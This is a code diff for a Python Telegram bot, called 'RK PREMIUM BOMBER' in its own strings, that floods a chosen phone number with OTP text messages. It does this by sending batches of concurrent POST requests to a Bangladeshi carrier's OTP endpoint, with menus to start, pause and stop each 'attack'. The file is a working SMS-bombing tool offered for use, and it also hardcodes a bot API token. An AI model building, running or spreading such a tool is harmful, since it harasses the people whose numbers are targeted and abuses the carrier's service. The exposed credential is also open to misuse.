@@ -2,192 +2,197 @@ import asyncio
 import aiohttp
 import telebot
 import time
+import datetime
+import pytz
+import psutil
 import json
 import os
-import logging
-import psutil
 from telebot.async_telebot import AsyncTeleBot
 from telebot import types
-from aiohttp import web 
-from datetime import datetime
-import pytz
 
 # --- CONFIGURATION ---
 API_TOKEN = '8479817459:AAEgiLY2rnRuzsgCbD91nTzCdDMTaM_vOAs'
 ADMIN_ID = 6048050987  
 TARGET_URL = "https://da-api.robi.com.bd/da-nll/otp/send"
-WAKEUP_URL = "https://rkbombx.onrender.com" 
-DB_FILE = "rk_users_v15.json"
-SYSTEM_STATS_FILE = "rk_system_stats.json"
+DB_FILE = "users_db.json"
 
-logging.basicConfig(level=logging.INFO)
 bot = AsyncTeleBot(API_TOKEN)
-TZ = pytz.timezone('Asia/Dhaka')
-
-# Global Storage
-active_attacks = {}  
+active_attacks = {} 
 user_states = {}
-authorized_users = {ADMIN_ID}
-global_sms_count = 0
 
-# --- DATA PERSISTENCE ---
-def load_all_data():
-    global global_sms_count, authorized_users
-    if os.path.exists(SYSTEM_STATS_FILE):
+# --- DATABASE MANAGEMENT ---
+def load_db():
+    if os.path.exists(DB_FILE):
         try:
-            with open(SYSTEM_STATS_FILE, "r") as f:
+            with open(DB_FILE, "r") as f:
                 data = json.load(f)
-                global_sms_count = data.get("total_sent", 0)
-        except: pass
+                return set(data.get("users", [ADMIN_ID])), data.get("all_time_users", [ADMIN_ID])
+        except: return {ADMIN_ID}, [ADMIN_ID]
+    return {ADMIN_ID}, [ADMIN_ID]
 
-def save_data():
-    try:
-        with open(SYSTEM_STATS_FILE, "w") as f:
-            json.dump({"total_sent": global_sms_count}, f)
-    except: pass
+def save_db(users, all_time_users):
+    with open(DB_FILE, "w") as f:
+        json.dump({"users": list(users), "all_time_users": list(set(all_time_users))}, f)
 
-# --- HEALTH SERVER ---
-async def handle_health(request):
-    return web.Response(text="RK BOT IS ACTIVE")
+authorized_users, all_time_users = load_db()
 
-async def start_server():
-    app = web.Application()
-    app.router.add_get('/', handle_health)
-    runner = web.AppRunner(app)
-    await runner.setup()
-    port = int(os.environ.get("PORT", 8080))
-    await web.TCPSite(runner, '0.0.0.0', port).start()
+# --- HELPERS ---
+def get_bd_time():
+    return datetime.datetime.now(pytz.timezone('Asia/Dhaka'))
 
-# --- KEYBOARDS ---
-def main_menu():
+def format_time(dt):
+    return dt.strftime("%I:%M:%S %p | %d-%m-%Y")
+
+# --- UI KEYBOARDS ---
+def main_keyboard():
     markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
-    markup.add("🚀 Start Attack", "📊 System Info", "📞 Support")
+    markup.add(
+        types.KeyboardButton("🚀 Start Attack"),
+        types.KeyboardButton("💎 My Status"),
+        types.KeyboardButton("📊 System Info"),
+        types.KeyboardButton("📞 Support")
+    )
     return markup
 
-def control_panel(chat_id, status):
+def attack_control_markup(state):
     markup = types.InlineKeyboardMarkup(row_width=2)
-    p_txt = "⏸ Pause" if status == "running" else "▶️ Resume"
-    p_call = f"pau_{chat_id}" if status == "running" else f"res_{chat_id}"
-    markup.add(types.InlineKeyboardButton(p_txt, callback_data=p_call),
-               types.InlineKeyboardButton("⏹ Stop", callback_data=f"stp_{chat_id}"))
+    p_text = "⏸ Pause" if state == 'running' else "▶️ Resume"
+    p_data = "pause" if state == 'running' else "resume"
+    markup.add(
+        types.InlineKeyboardButton(p_text, callback_data=p_data),
+        types.InlineKeyboardButton("⏹ Stop", callback_data="stop")
+    )
     return markup
 
-# --- ENGINE ---
-async def send_otp(session, number, stats):
-    global global_sms_count
+# --- BOMBING ENGINE ---
+async def send_request(session, number, stats):
     try:
-        async with session.post(TARGET_URL, json={"msisdn": number}, timeout=5) as resp:
-            if resp.status == 200:
-                stats['ok'] += 1
-                global_sms_count += 1
-            else: stats['err'] += 1
-    except: stats['err'] += 1
+        async with session.post(TARGET_URL, json={"msisdn": number}, timeout=10) as resp:
+            if resp.status == 200: stats['success'] += 1
+            else: stats['fail'] += 1
+    except: stats['fail'] += 1
     stats['total'] += 1
 
-async def attack_logic(chat_id, message_id, target, limit):
-    evt = asyncio.Event()
-    evt.set()
-    start_time = datetime.now(TZ)
-    active_attacks[chat_id] = {'event': evt, 'status': 'running', 'stop': False}
-    stats = {'ok': 0, 'err': 0, 'total': 0}
-    
+async def run_attack(chat_id, message_id, number, limit):
+    stats = {'success': 0, 'fail': 0, 'total': 0}
+    active_attacks[chat_id] = {'state': 'running'}
+    start_time = time.time()
+
     async with aiohttp.ClientSession() as session:
         while stats['total'] < limit:
-            if active_attacks.get(chat_id, {}).get('stop'): break
-            if not evt.is_set(): await evt.wait()
-            
-            batch = min(40, limit - stats['total'])
-            tasks = [send_otp(session, target, stats) for _ in range(batch)]
+            state = active_attacks.get(chat_id, {}).get('state')
+            if not state or state == 'stopped': break
+            if state == 'paused':
+                await asyncio.sleep(1)
+                continue
+
+            batch = min(20, limit - stats['total'])
+            tasks = [send_request(session, number, stats) for _ in range(batch)]
             await asyncio.gather(*tasks)
+
+            percent = int((stats['total'] / limit) * 100)
+            bar = "🔹" * (percent // 10) + "▫️" * (10 - (percent // 10))
             
             try:
-                prog = int((stats['total']/limit)*100)
-                bar = "🔹" * (prog // 10) + "▫️" * (10 - (prog // 10))
-                elapsed = int((datetime.now(TZ) - start_time).total_seconds())
-                
-                monitor = (
+                text = (
+                    f"⚡ **RK ATTACK MONITOR** ⚡\n"
                     f"━━━━━━━━━━━━━━━━━━━━\n"
-                    f"📱 **Target:** `{target}`\n"
-                    f"📊 **Progress:** `{prog}%` {bar}\n"
-                    f"✅ **Success:** `{stats['ok']}` ]\n"
-                    f"❌ **Fail:** `{stats['err']}` ]\n"
-                    f"🔢 **Total Sent:** `{stats['total']}/{limit}` ]\n"
+                    f"📱 **Target:** `{number}`\n"
+                    f"📊 **Progress:** `{percent}%` | {bar}\n"
+                    f"✅ **Success:** `{stats['success']}` | ❌ **Fail:** `{stats['fail']}`\n"
+                    f"🔢 **Total:** `{stats['total']}/{limit}`\n"
                     f"━━━━━━━━━━━━━━━━━━━━\n"
-                    f"🕒 **Started:** `{start_time.strftime('%I:%M:%S %p')}` ]\n"
-                    f"⏳ **Running_Time:** `{elapsed}s` ]\n"
-                    f"📡 **STATUS:** `{active_attacks[chat_id]['status'].upper()}` ]\n"
-                    f"━━━━━━━━━━━━━━━━━━━━"
+                    f"📡 **Status:** `{state.upper()}`"
                 )
-                await bot.edit_message_text(monitor, chat_id, message_id, 
-                                          reply_markup=control_panel(chat_id, active_attacks[chat_id]['status']),
-                                          parse_mode="Markdown")
+                await bot.edit_message_text(text, chat_id, message_id, reply_markup=attack_control_markup(state), parse_mode='Markdown')
             except: pass
-            await asyncio.sleep(1)
-            
+            await asyncio.sleep(0.6)
+
+    await bot.send_message(chat_id, "🏁 **Attack Finished!**", reply_markup=main_keyboard())
     active_attacks.pop(chat_id, None)
-    save_data()
-    await bot.send_message(chat_id, f"🏁 **Attack Finished!**\nTarget: `{target}`\nSuccess: `{stats['ok']}`", reply_markup=main_menu())
 
-# --- ALL HANDLERS (Sequential) ---
-
+# --- COMMANDS ---
 @bot.message_handler(commands=['start'])
-async def start(m):
-    await bot.send_message(m.chat.id, "🔥 **RK V15.3 PRO ONLINE**", reply_markup=main_menu())
+async def cmd_start(message):
+    if message.chat.id not in all_time_users:
+        all_time_users.append(message.chat.id)
+        save_db(authorized_users, all_time_users)
+    
+    welcome = (
+        f"🔥 **RK PREMIUM BOMBER V9** 🔥\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"স্বাগতম `{message.from_user.first_name}`!\n"
+        f"আমি আরকে সিস্টেমের অফিশিয়াল বোম্বার বট।\n\n"
+        f"🕒 সময়: {get_bd_time().strftime('%I:%M %p')}"
+    )
+    await bot.send_message(message.chat.id, welcome, reply_markup=main_keyboard(), parse_mode='Markdown')
 
+@bot.message_handler(commands=['broadcast'])
+async def cmd_broadcast(message):
+    if message.from_user.id == ADMIN_ID:
+        msg_to_send = message.text.replace("/broadcast ", "")
+        if not msg_to_send or msg_to_send == "/broadcast":
+            return await bot.reply_to(message, "ব্যবহার: `/broadcast আপনার মেসেজ`")
+        
+        count = 0
+        for user_id in all_time_users:
+            try:
+                await bot.send_message(user_id, f"📢 **ADMIN MESSAGE:**\n\n{msg_to_send}", parse_mode='Markdown')
+                count += 1
+            except: continue
+        await bot.reply_to(message, f"✅ {count} জন ইউজারের কাছে মেসেজ পাঠানো হয়েছে।")
+
+@bot.message_handler(commands=['add'])
+async def cmd_add(message):
+    if message.from_user.id == ADMIN_ID:
+        try:
+            new_id = int(message.text.split()[1])
+            authorized_users.add(new_id)
+            save_db(authorized_users, all_time_users)
+            await bot.reply_to(message, f"✅ User `{new_id}` Added!")
+        except: await bot.reply_to(message, "Usage: `/add ID`")
+
+# --- TEXT HANDLERS ---
 @bot.message_handler(func=lambda m: True)
-async def handle_all_messages(m):
-    cid = m.chat.id
-    text = m.text
+async def handle_text(message):
+    cid = message.chat.id
+    if message.text == "🚀 Start Attack":
+        if cid not in authorized_users:
+            return await bot.reply_to(message, "❌ **Access Denied!**\nContact @itzrkraihan")
+        user_states[cid] = 'num'
+        await bot.send_message(cid, "📞 **Target Number:**", reply_markup=types.ReplyKeyboardRemove())
+    
+    elif cid in user_states and user_states[cid] == 'num':
+        if len(message.text) == 11:
+            user_states[cid] = {'st': 'lim', 'n': message.text}
+            await bot.send_message(cid, "🔢 **SMS Limit (Max 5000):**")
+        else: await bot.reply_to(message, "❌ Invalid Number!")
 
-    # মেইন মেনু চেক
-    if text == "🚀 Start Attack":
-        if cid != ADMIN_ID: return await bot.reply_to(m, "🚫 অনুমতি নেই!")
-        user_states[cid] = {"step": "num"}
-        return await bot.send_message(cid, "📞 **টার্গেট নম্বর দিন:**", reply_markup=types.ReplyKeyboardRemove())
+    elif cid in user_states and isinstance(user_states[cid], dict) and user_states[cid].get('st') == 'lim':
+        try:
+            limit = min(int(message.text), 5000)
+            num = user_states[cid]['n']
+            del user_states[cid]
+            msg = await bot.send_message(cid, "⚙️ **Engine Initializing...**")
+            asyncio.create_task(run_attack(cid, msg.message_id, num, limit))
+        except: await bot.reply_to(message, "❌ Invalid Limit!")
+    
+    elif message.text == "📊 System Info":
+        await bot.reply_to(message, f"🖥 CPU: {psutil.cpu_percent()}% | RAM: {psutil.virtual_memory().percent}%")
+    
+    elif message.text == "💎 My Status":
+        status = "Premium 💎" if cid in authorized_users else "Free 🆓"
+        await bot.reply_to(message, f"👤 User: {message.from_user.first_name}\n📊 Status: {status}")
 
-    if text == "📊 System Info":
-        return await bot.reply_to(m, f"🖥 CPU: {psutil.cpu_percent()}% | RAM: {psutil.virtual_memory().percent}%\n📨 Total: {global_sms_count}")
-
-    # স্টেট চেক (নম্বর এবং লিমিট ইনপুট)
-    if cid in user_states:
-        state = user_states[cid].get("step")
-        
-        if state == "num":
-            if len(text) == 11 and text.isdigit():
-                user_states[cid] = {"step": "limit", "target": text}
-                await bot.send_message(cid, "🔢 **পরিমাণ দিন (Max 1,000,000):**")
-            else:
-                await bot.reply_to(m, "❌ সঠিক ১১ ডিজিট নম্বর দিন।")
-        
-        elif state == "limit":
-            if text.isdigit():
-                limit = min(int(text), 1000000)
-                target = user_states[cid]['target']
-                user_states.pop(cid)
-                msg = await bot.send_message(cid, "⚡ ইঞ্জিন শুরু হচ্ছে...")
-                asyncio.create_task(attack_logic(cid, msg.message_id, target, limit))
-            else:
-                await bot.reply_to(m, "⚠️ শুধু সংখ্যা দিন।")
-
-@bot.callback_query_handler(func=lambda c: True)
-async def callbacks(c):
-    cid = c.message.chat.id
+@bot.callback_query_handler(func=lambda call: True)
+async def cb_handler(call):
+    cid = call.message.chat.id
     if cid in active_attacks:
-        if c.data.startswith("pau_"):
-            active_attacks[cid]['event'].clear()
-            active_attacks[cid]['status'] = "paused"
-        elif c.data.startswith("res_"):
-            active_attacks[cid]['event'].set()
-            active_attacks[cid]['status'] = "running"
-        elif c.data.startswith("stp_"):
-            active_attacks[cid]['stop'] = True
-            active_attacks[cid]['event'].set()
-    await bot.answer_callback_query(c.id)
-
-# --- START ---
-async def run():
-    load_all_data()
-    await asyncio.gather(start_server(), bot.polling(non_stop=True))
+        if call.data == "pause": active_attacks[cid]['state'] = 'paused'
+        elif call.data == "resume": active_attacks[cid]['state'] = 'running'
+        elif call.data == "stop": active_attacks[cid]['state'] = 'stopped'
+        await bot.answer_callback_query(call.id, "Executed!")
 
 if __name__ == "__main__":
-    asyncio.run(run())
+    print("RK ULTIMATE V9 IS LIVE...")
+    asyncio.run(bot.polling(non_stop=True))
